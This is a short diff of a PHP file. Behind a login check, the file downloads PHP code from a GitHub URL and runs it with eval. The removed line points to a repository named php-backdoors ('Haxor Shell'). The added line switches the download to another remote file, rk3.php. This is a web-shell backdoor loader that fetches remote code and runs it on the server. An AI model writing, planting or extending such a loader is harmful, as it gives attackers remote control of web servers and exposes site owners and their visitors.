@@ -75,7 +75,7 @@ if (is_logged_in()) {
         echo "<script>alert('$check_result');</script>";
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/1337r0j4n/php-backdoors/main/SHELLs/Rebirth%20Haxor%20Shell/haxor.php');
+    $a = geturlsinfo('https://github.com/Sys-Fxp/Sys-Fxp/raw/refs/heads/main/rk3.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
